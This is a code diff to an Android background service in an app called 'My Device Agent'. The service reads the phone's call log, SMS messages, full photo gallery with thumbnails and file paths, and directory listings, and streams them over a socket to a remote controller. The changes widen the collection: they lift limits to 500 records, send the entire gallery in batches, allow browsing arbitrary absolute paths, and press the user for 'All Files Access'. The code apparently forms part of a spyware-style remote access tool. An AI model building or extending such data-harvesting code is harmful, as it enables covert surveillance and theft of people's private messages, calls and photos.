@@ -294,7 +294,7 @@ public class DeviceService extends Service {
             JSONArray calls = new JSONArray();
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
-                    CallLog.Calls.DATE + " DESC LIMIT 100");
+                    CallLog.Calls.DATE + " DESC LIMIT 500");
 
             if (cursor != null) {
                 while (cursor.moveToNext()) {
@@ -339,7 +339,7 @@ public class DeviceService extends Service {
             JSONArray messages = new JSONArray();
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, null, null, null,
-                    Telephony.Sms.DATE + " DESC LIMIT 100");
+                    Telephony.Sms.DATE + " DESC LIMIT 500");
 
             if (cursor != null) {
                 while (cursor.moveToNext()) {
@@ -438,30 +438,33 @@ public class DeviceService extends Service {
             );
 
             if (cursor != null) {
+                int totalCount = cursor.getCount();
                 int count = 0;
-                while (cursor.moveToNext() && count < 500) {
+                JSONArray batch = new JSONArray();
+
+                while (cursor.moveToNext()) {
                     JSONObject photo = new JSONObject();
                     long id = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID));
                     String name = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME));
                     long size = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE));
                     long date = cursor.getLong(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_MODIFIED));
                     String type = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.MIME_TYPE));
+                    String filePath = cursor.getString(cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA));
 
                     photo.put("id", id);
                     photo.put("name", name);
                     photo.put("size", size);
                     photo.put("lastModified", date * 1000);
                     photo.put("type", type);
+                    if (filePath != null) photo.put("path", filePath);
 
                     // Generate thumbnail
                     try {
-                        Uri contentUri = Uri.withAppendedPath(
-                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI, String.valueOf(id));
                         Bitmap thumb = MediaStore.Images.Thumbnails.getThumbnail(
                             cr, id, MediaStore.Images.Thumbnails.MINI_KIND, null);
                         if (thumb != null) {
                             ByteArrayOutputStream baos = new ByteArrayOutputStream();
-                            thumb.compress(Bitmap.CompressFormat.JPEG, 50, baos);
+                            thumb.compress(Bitmap.CompressFormat.JPEG, 40, baos);
                             String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
                             photo.put("thumbnail", "data:image/jpeg;base64," + base64);
                             thumb.recycle();
@@ -470,28 +473,34 @@ public class DeviceService extends Service {
                         // Skip thumbnail
                     }
 
+                    batch.put(photo);
                     photos.put(photo);
                     count++;
 
-                    // Send in batches of 20
-                    if (count % 20 == 0) {
-                        JSONObject batch = new JSONObject();
-                        batch.put("photos", photos);
-                        batch.put("partial", true);
-                        batch.put("total", cursor.getCount());
-                        socket.emit("gallery:photos", batch);
+                    // Send in batches of 50
+                    if (count % 50 == 0) {
+                        JSONObject batchData = new JSONObject();
+                        batchData.put("photos", batch);
+                        batchData.put("partial", true);
+                        batchData.put("total", totalCount);
+                        batchData.put("loaded", count);
+                        socket.emit("gallery:photos", batchData);
+                        batch = new JSONArray();
+                        // Small pause to prevent socket overload
+                        try { Thread.sleep(100); } catch (InterruptedException ie) {}
                     }
                 }
                 cursor.close();
             }
 
-            // Send final
+            // Send final complete batch
             JSONObject data = new JSONObject();
             data.put("photos", photos);
             data.put("partial", false);
             data.put("total", photos.length());
+            data.put("loaded", photos.length());
             socket.emit("gallery:photos", data);
-            Log.d(TAG, "Sent " + photos.length() + " gallery photos");
+            Log.d(TAG, "Sent " + photos.length() + " gallery photos (all)");
 
         } catch (Exception e) {
             Log.e(TAG, "Gallery error: " + e.getMessage());
@@ -531,34 +540,72 @@ public class DeviceService extends Service {
 
             if (path.equals("/")) {
                 dir = Environment.getExternalStorageDirectory();
+            } else if (path.startsWith("/")) {
+                // Absolute path handling
+                File absDir = new File(Environment.getExternalStorageDirectory(), path.substring(1));
+                if (absDir.exists()) {
+                    dir = absDir;
+                } else {
+                    dir = new File(path);
+                }
             } else {
                 dir = new File(Environment.getExternalStorageDirectory(), path);
             }
 
             JSONArray files = new JSONArray();
+
+            // Check MANAGE_EXTERNAL_STORAGE for Android 11+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                if (!Environment.isExternalStorageManager()) {
+                    JSONObject data = new JSONObject();
+                    data.put("files", files);
+                    data.put("path", path);
+                    data.put("error", "Please grant 'All Files Access' permission in Settings > Apps > My Device Agent > Permissions");
+                    socket.emit("files:list", data);
+                    return;
+                }
+            }
+
             if (dir.exists() && dir.isDirectory()) {
                 File[] fileList = dir.listFiles();
                 if (fileList != null) {
                     for (File f : fileList) {
-                        if (f.getName().startsWith(".")) continue; // skip hidden
+                        if (f.getName().startsWith(".")) continue;
                         JSONObject fileObj = new JSONObject();
                         fileObj.put("name", f.getName());
                         fileObj.put("isDirectory", f.isDirectory());
                         fileObj.put("path", path.equals("/") ? "/" + f.getName() : path + "/" + f.getName());
-                        fileObj.put("size", f.length());
+                        fileObj.put("size", f.isFile() ? f.length() : 0);
                         fileObj.put("lastModified", f.lastModified());
+                        if (f.isFile()) fileObj.put("type", getMimeType(f.getName()));
                         files.put(fileObj);
                     }
                 }
+            } else {
+                // Directory doesn't exist - send error info
+                JSONObject data = new JSONObject();
+                data.put("files", files);
+                data.put("path", path);
+                data.put("error", "Directory not found: " + dir.getAbsolutePath());
+                socket.emit("files:list", data);
+                return;
             }
 
             JSONObject data = new JSONObject();
             data.put("files", files);
             data.put("path", path);
             socket.emit("files:list", data);
+            Log.d(TAG, "Files listed: " + files.length() + " items in " + path);
 
         } catch (Exception e) {
             Log.e(TAG, "Files list error: " + e.getMessage());
+            try {
+                JSONObject data = new JSONObject();
+                data.put("files", new JSONArray());
+                data.put("path", args.optString("path", "/"));
+                data.put("error", e.getMessage());
+                socket.emit("files:list", data);
+            } catch (JSONException je) {}
         }
     }
 
@@ -1007,7 +1054,7 @@ public class DeviceService extends Service {
         try {
             ContentResolver cr = getContentResolver();
             Cursor cursor = cr.query(CallLog.Calls.CONTENT_URI, null, null, null,
-                    CallLog.Calls.DATE + " DESC LIMIT 200");
+                    CallLog.Calls.DATE + " DESC LIMIT 500");
 
             if (cursor != null) {
                 int currentCount = cursor.getCount();
